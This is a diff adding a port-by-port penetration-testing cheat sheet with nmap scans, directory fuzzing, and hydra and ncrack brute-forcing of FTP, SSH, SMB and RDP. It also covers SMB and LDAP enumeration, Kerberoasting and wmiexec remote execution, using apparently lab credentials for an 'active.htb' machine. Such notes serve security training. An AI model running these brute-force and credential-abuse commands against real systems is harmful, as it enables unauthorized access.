@@ -1,1 +1,187 @@
 # External-Enumeration
+
+##  NMAP
+
+#### Silent mode
+```
+nmap -T4 -sS -sV -vv -Pn -p<PORT> <IP>
+```
+#### Agressive mode
+```
+nmap -T4 -sS -A -p- <IP>
+```
+#### UDP Scan
+```
+nmap -T4 -sUV <IP>
+```
+#### List the nmap script
+```
+ls -l /usr/share/nmap/scripts/smb*
+```
+
+## Fuzzing
+
+#### Dirb
+```
+dirb http://10.0.0.1/abc/ /usr/share/wordlists/dirb/big.txt  
+```
+#### Gobuster
+```
+gobuster -u http://10.11.1.10/ -w /usr/share/wordlists/dirb/common.txt -e -t 20
+gobuster dir -u http://10.11.1.10/ -w /usr/share/wordlists/dirb/big.txt -t 30 -e -k -x .html,.php,.asp,.aspx,.htm,.xml,.json,.jsp,.pl
+```
+
+
+## Vulnerability scanner
+```
+nikto -host=http://example.com
+```
+
+## Port 21
+#### Vuln detection using nmap
+```
+nmap -p 21 -sV -sC --script="ftp-vuln-*, ftp-anon" 10.0.0.1-254
+```
+#### Hydra - Bruteforcing
+```
+hydra -s 21 -t 4 -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ftp
+```
+
+
+## Port 22
+#### Hydra - Bruteforcing
+```
+hydra -s 22 -v -t 4 -l root -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ssh
+```
+
+
+## Port 25
+## Port 110
+## Port 111
+```
+rpcinfo -p 10.11.1.111
+rpcclient -U "" 10.11.1.111
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+```
+
+
+## Port 139, 445
+#### Basic enumeration
+```
+enum4linux -a 10.0.0.1
+```
+
+#### List nmap scripts - Detection vuln port 445 139
+```
+nmap -p 445,139 -Pn --script=smb-vuln-*.nse 10.0.0.1
+nmap -p 445,139 -Pn --script smb-protocols.nse 10.0.0.1
+
+nmap -v -p 139,445 --script=smb-os-discovery 10.0.0.1
+nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.0.0.1
+
+nmap -v -p 139,445 --script=smb* 10.0.0.1
+```
+
+#### Connection attempt
+```
+smbclient -L \\10.0.0.1
+smbclient -L 10.11.1.31 -U anonymous
+smbclient -L 10.0.0.1 --options='client min protocol=NT1'
+```
+
+#### SMBmap List the rights on the folders / recursif mode
+```
+smbmap -H 10.0.0.1
+
+// Reculsive enumeration
+smbmap -H 10.0.0.1 -R
+
+// Recursive enumeration on a specific folder
+smbmap -H 10.129.168.32 -R 'Replication\active.htb'
+
+// Authenticated enumeration
+smbmap -H 10.129.168.32 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -R
+
+// Download a file
+smbmap -H 10.129.168.32 --download '.\Users\SVC_TGS\Desktop\user.txt'
+
+// If error ‘[!] Authentication error on 10.0.0.1’ try with a fake user -u ‘123’
+smbmap -H 10.0.0.1 -R -u ‘123’
+```
+
+#### Detection of the version using Wireshark
+```
+If the following error appear "protocol negotiation failed : NT_STATUS_CONNECTION_DISCONNECTED", it's probably due to the old smb version of the victim.
+Solution: Intercept the trafic of the command ‘smbclient -L \\<IP> with wireshark and search the negotiation of the smb version.
+```
+
+#### Access through through the kali folder
+```
+smb://<ip>/<folder>
+```
+#### Mount a share folder
+```
+mount -t cifs //10.0.0.1/share /mnt/share
+mount -t cifs -o "username=user,password=password" //10.0.0.1/share /mnt/share
+```
+
+#### Bruteforce
+```
+hydra -L users.txt -P passs.txt smb://10.0.0.1 -t 4
+hydra -L username.txt -P password.txt 10.0.0.1 smb -V
+```
+
+
+## Port 143
+## Port 389
+```
+ldapsearch -x -h 10.129.168.32 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
+
+./GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.168.32
+
+
+ldapsearch -x -h 10.129.168.32 -p 389 -D 'SVC_TGS' -w'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
+
+
+./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.168.32
+
+./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.168.32 -request
+
+./wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.168.32
+```
+
+
+## Port 587
+## Port 1433
+#### Basic connection using sqsh
+```
+sqsh -U sa -P password -S 10.0.0.1:1433 -D mydb
+```
+#### Obtain a pretty output
+```
+go -m pretty
+```
+#### Execute command trough sqsh
+#### Activate xp_cmdshell
+
+
+## Port 3389
+
+#### Nmap - Scan vuln
+```
+nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.0.0.1
+```
+#### Bruteforce 
+```
+hydra -L user.txt -P pass.txt 10.0.0.1 rdp
+ncrack -vv --user administrator -P passwords.txt rdp://192.168.1.10,CL=1
+```
+#### Remote Desktop
+rdesktop 192.168.1.10
+rdesktop -u <username> <IP>
+rdesktop -d <domain> -u <username> -p <password> <IP>
